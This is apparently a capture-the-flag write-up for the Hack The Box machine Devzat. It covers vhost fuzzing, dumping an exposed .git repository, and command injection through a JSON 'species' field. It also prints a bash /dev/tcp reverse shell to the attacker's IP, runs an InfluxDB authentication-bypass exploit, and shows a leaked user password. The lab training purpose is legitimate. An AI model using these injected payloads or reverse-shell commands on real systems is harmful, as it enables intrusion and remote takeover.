In this Hackthebox we will get a user access through a command injection in a vhost , then will make port forwarding to find a service that will give us the password for another user who have access to some backups, in this backups we can find the source-code for a bot , the bot has 2 versions one of them is running locally and it has a command "file" which allows us to read any file on the sytsem we will make port forwarding one more time to read the root private key and login as root

# Scanning :

i will start with basic scanning :

```bash
nmap -A -T 4 -sV 10.10.11.118

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-Go
| ssh-hostkey:
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)

```

and we can see `devzat.htb` at the scan result so we can add it to the `/etc/hosts` and start fuzzing vhosts.

```bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devzat.htb -H "Host: FUZZ.devzat.htb" -fc 302,404

pets                    [Status: 200, Size: 510, Words: 20, Lines: 21]
```

we can add `pets.devzat.htb` also to the `/etc/hosts`

# Enumeration :

### Discovery

we can start enumerating the **devzat.htb** web application first. we can see it talks about some chat application and can try it with :

![image](/assets/images/devzat/20220311134725.png)

so we can try it using :

```bash
ssh -l Mesbaha  devzat.htb -p 8000
```

looking for help to know how to use it :

![image](/assets/images/devzat/20220311135035.png)

![image](/assets/images/devzat/20220311135132.png)

okay we will check it latter after we finish discovery phase

visiting **pets.devzat.htb** we have the option to add new item

![image](/assets/images/devzat/20220311135355.png)

we can also see how the request is sent :

![image](/assets/images/devzat/20220311135703.png)

okay now we have some leads , we can also start directory busting to check if there is something interesting

### Directory Busting

```bash
dirsearch -u http://devzat.htb/  -w /usr/share/wordlists/dirb/common.txt

[06:55:30] 301 -  309B  - /assets  ->  http://devzat.htb/assets/
[06:55:35] 301 -  309B  - /images  ->  http://devzat.htb/images/
[06:55:35] 200 -    6KB - /index.html
[06:55:35] 301 -  313B  - /javascript  ->  http://devzat.htb/javascript/
[06:55:40] 403 -  275B  - /server-status
```

```bash
dirsearch -u http://pets.devzat.htb/  -w /usr/share/wordlists/dirb/common.txt

[06:58:36] 200 -   23B  - /.git/HEAD
[06:58:39] 301 -   42B  - /build  ->  /build/
[06:58:40] 301 -   40B  - /css  ->  /css/
[06:58:48] 403 -  280B  - /server-status
```

this **/.git** seems worthy to check

![image](/assets/images/devzat/20220311140209.png)

we need to download all of this and check them

```bash
wget -r http://pets.devzat.htb/.git/
```

once i am introduced with a **.git** i always use [GitTools](https://github.com/internetwache/GitTools) to make the enumeration easier.

i will start with the **extractor** to see broken repository commits and incompleted commits.

```bash
./extractor.sh pets.devzat.htb pets.dump
```

and we have these 3 commits :

```
0-ef07a04ebb2fc92cf74a39e0e4b843630666a705  1-8274d7a547c0c3854c074579dfc359664082a8f6  2-464614f32483e1fde60ee53f5d3b4d468d80ff62
```

we can run the **tree** command to have an overview look , we will see a **main.go** in all the folders we can take a look at it and will find :

![image](/assets/images/devzat/20220311141743.png)

it seems the "**species**" attribute which we sent in the **pets.devzat.htb** is not filtered before being passed to **exec.Command**

we can try some command injection and see if it works

# Foothold

at the **pets.devzat.htb** page we can now try to add an item again but this time we will try to ping our host:

```
{"name":"pingme","species":"cat;ping -c 4 10.10.16.106"}
```

nice we got a reply , now Let's have a reverse shell !

![Alt Text](https://media.giphy.com/assets/images/uNp22kQO4QCxa/giphy.gif)

however when i tried `sh -i >& /dev/tcp/10.10.16.106/9090 0>&1` it doesn't return a connection back so i though maybe the spaces and special characters are the reason .

```bash
echo "sh -i >& /dev/tcp/10.10.16.106/9090 0>&1" | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA2LzkwOTAgMD4mMQo=
```

![image](/assets/images/devzat/20220311143241.png)

and finally :

![image](/assets/images/devzat/20220311143301.png)

spawn a tty shell:

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl+z
stty raw -echo ;fg
Enter key x2
export TERM=xterm
```

and we have a nice shell as **patrick** user on the machine

## Enumerating the machine

at the `/etc/passwd ` we can see this strange **backup**

```
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
```

we can visit this **/var/backups/** maybe it contains useful information can help us escalate our privilege

![image](/assets/images/devzat/20220311151418.png)

But only user **catherine** can use it so we should find a way to escalate to this user first :(

```
-rw-------  1 catherine catherine 28297 Jul 16  2021 devzat-dev.zip
-rw-------  1 catherine catherine 27567 Jul 16  2021 devzat-main.zip

```

if we run `ss-lpnut`

```bash
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      836/./petshop
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::8000                 :::*                    LISTEN      837/./devchat
```

we can see port **8443** and port **8086** are running locally , and there is no netcat on the machine to know what are the services running. so we have to make port forward to see the ports running.

### port forward

forward port **8086** from the machine to your side.

_first:_ generate ssh keys

```bash
ssh-keygen  -f devzat
```

and put your public key at the **authorized_keys** on the machine side

_Second_: forward the port :

```bash
# at your side
ssh  -i devzat -N -L 8086:127.0.0.1:8086  patrick@devzat.htb
```

now if we have scanned our localhost will find :

![image](/assets/images/devzat/20220311162554.png)

if we search for this version of the service will find immediatley [this](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933) exploit

![image](/assets/images/devzat/20220311163816.png)

![image](/assets/images/devzat/20220311164104.png)

![image](/assets/images/devzat/20220311164145.png)

![image](/assets/images/devzat/20220311164415.png)

![image](/assets/images/devzat/20220311165802.png)

and we can see the user **catherine** shows up with this password : `woBeeYareedahc7Oogeephies7Aiseci`

now we can switch to user **catherine** easily :

![image](/assets/images/devzat/20220311170147.png)

# Root access:

now as we are logged in as the user **catherine** we can check the `/var/backups` which we can't access earlier.

download them at our machine first :

![image](/assets/images/devzat/20220311170412.png)

after we unzip them we can see they have exact same files , so we can check if there are any difference between the content

```bash
diff main/commands.go dev/commands.go
```

![image](/assets/images/devzat/20220311171227.png)

```go
< 	commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode}
---
> 	commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file}
> }

```

and we can the option **"file"** , if we read the source code we will find :

```bash
file = commandInfo{"file", "Paste a files content directly to chat [alpha]", fileCommand, 1, false, nil}

```

and will find :

![image](/assets/images/devzat/20220311172609.png)

but if we tried the connection command will see the command **/file** doesn't exist :(

```bash
ssh -l mesbah devzat.htb -p 8000
```

![image](/assets/images/devzat/20220311172636.png)

we can read other codes under the **dev** file we have and will find at **"devchat.go"**

![image](/assets/images/devzat/20220311172810.png)

this port is running locally we can forward it then connect to the bot :

```bash
# at your side :
ssh -i devzat  -L 8443:127.0.0.1:8443 -N patrick@devzat.htb
```

then connect to the bot :

```bash
ssh -l mesbah 127.0.0.1 -p 8443
```

![image](/assets/images/devzat/20220311173041.png)

now we can read the **root.txt** , or we can read the **/root/.ssh/id_rsa** to gain the root access
